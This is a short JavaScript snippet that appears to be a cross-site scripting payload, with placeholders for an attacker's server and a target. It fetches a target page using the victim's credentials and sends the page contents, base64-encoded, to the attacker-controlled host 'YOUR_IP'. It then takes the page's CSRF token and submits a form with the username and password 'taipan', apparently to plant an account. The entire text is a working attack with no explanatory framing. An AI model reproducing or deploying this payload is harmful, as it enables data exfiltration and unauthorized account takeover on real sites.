myhtserv = 'http://YOUR_IP/'
targetu = 'http://TARGET'

username = 'taipan'
password = 'taipan'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
	if (req.readyState == 4) {
		req2 = new XMLHttpRequest;
		req2.open('GET', myhtserv + btoa(this.responseText), false);
		req2.send();
	}
}

req.open('GET', targetu, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "TARGET2", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);
